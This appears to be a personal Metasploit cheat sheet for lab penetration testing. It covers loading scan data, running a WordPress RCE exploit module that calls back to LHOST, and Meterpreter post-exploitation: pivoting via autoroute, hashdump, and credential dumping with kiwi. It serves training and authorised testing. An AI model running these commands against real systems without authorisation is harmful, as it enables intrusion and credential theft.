# <u>Metasploit Workflow Cheat Sheet</u>

## Set <u>Global variables</u> in Metasploit

### Command
```msf
setg RHOSTS 192.168.1.10
setg RHOST 192.168.1.10     #some modules have rhis instead
```

## 🗂️ Workspace Management
```msf
workspace -a testing    # Create new workspace
workspace testing       # Switch to it
```

## 📥 Import Scan Data
```msf
db_import /home/kali/ubuntu_nmap.xml
```

## 🔍 Verify Imported Data
```msf
hosts        # List discovered hosts
services     # Show open ports & services per host
vulns        # Display identified vulnerabilities
```

## 🔄 Run Internal Nmap (Auto-saves to DB)
```msf
db_nmap -Pn -A 192.168.125.19
```

> 💡 No need for `-oX` — results auto-save to current workspace.

---

## 🔎 Module Discovery & Usage
### Find Modules
```msf
search wordpress
search type:auxiliary portscan
```

### Load a Module
```msf
use exploit/multi/http/wp_bricks_builder_rce
# OR use index from search: use 3
```

### View Module Info
```msf
info          # Full module details
options  # Required/optional settings (same as `show options`)
```

### Configure & Run
```msf
set RHOSTS 192.168.125.19
set LHOST 192.168.125.18
exploit       # or `run` (identical in most cases)
```

---
---
## 🖥️ Post-Exploitation (Meterpreter)

### Basic Recon
```msf
sysinfo               # OS, arch, user info

shell                 # Drop to system shell
# Then, depending on OS:
#   Linux:  /bin/bash -i    (to get interactive shell)
#   Windows: whoami         (to confirm current user)
```

>- **On Windows targets**:  
    → `shell` in Meterpreter **already gives you a Windows command prompt (`cmd.exe`)**.  
    → **No need** to run anything like `cmd.exe` or `powershell.exe` manually — you’re already in a CLI.
>- **On Linux targets**:  
    → `shell` gives you `/bin/sh`, which is often **non-interactive** (no history, no tab-completion).  
    → So you **upgrade** it with: `/bin/bash -i`
    
### Pivoting Setup
1. Get **internal IP** of compromised host (`ip a` or `ipconfig`)
2. Still in Meterpreter add route through session:
   ```msf
   run autoroute -s 192.168.99.0/24 #Or just the target IP Address
   ```
   
>Routes all traffic for `192.168.99.0/24` through this session.

3. Background session:
   ```msf
   background #To put meterpreter session in background
   ```

```msf
sessions              # List active sessions
sessions -i <ID>        # Interact with a specific session (e.g., sessions -i 1)
```
### Pivot Scanning
```msf
search portscan       # Find scanner modules
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.99.20
run
```

### Clean Up
```msf
back                  # Exit current module
unset all             # Clear all settings (optional)
```

---
---
# Meterpreter Session Management

## Background a Session
### Method 1: Command

```msf
meterpreter > background
```
→ Returns to `msf6>` prompt; session stays alive with ID (e.g., Session 1).

### Method 2: Shortcut

Press `Ctrl + Z` → type `y` when prompted.

---
## Manage Sessions

| Action | Command | Description |
|-------|--------|------------|
| **List** | `sessions` | Show all active sessions |
| **Interact** | `sessions -i 1` | Reconnect to session #1 |
| **Kill** | `sessions -k 1` | Terminate session #1 |
| **Run command on all** | `sessions -c "sysinfo"` | Execute command across all sessions |

> 💡 Use `background` to multitask in Metasploit without losing access.

---
---
# `getuid` and Other Meterpreter Commands

## Is `getuid` Only for Meterpreter?

**Yes.**  

`getuid` is a **Meterpreter-specific command** — it does **not exist** in regular shells (bash, cmd, PowerShell).

It’s part of Meterpreter’s built-in post-exploitation API.

---
## Common Meterpreter Commands

| Command | Purpose |
|--------|--------|
| `getuid` | Show current user context (e.g., `NT AUTHORITY\SYSTEM`) |
| `sysinfo` | OS version, architecture, hostname |
| `ps` | List running processes |
| `migrate <PID>` | Move Meterpreter into another process |
| `shell` | Drop to native OS shell (cmd/bash) |
| `upload / download` | Transfer files |
| `ipconfig` | Network interfaces |
| `route` | View/add routing table entries |
| `hashdump` | Dump SAM hashes (requires SYSTEM) |
| `background` | Return to MSF console, keep session |

> 💡 These only work **inside an active Meterpreter session**.

---
## How to Discover All Available Commands

### 1. **In Meterpreter:**

```msf
meterpreter > help
```

→ Lists **all built-in commands** for your payload type (Windows/Linux, x86/x64).

### 2. **Load Extensions:**

Some commands come from **extensions**:
```msf
meterpreter > load kiwi          # Mimikatz-like creds dumping
meterpreter > load espia         # Screen capture
meterpreter > help               # Now shows new commands
```

---
---
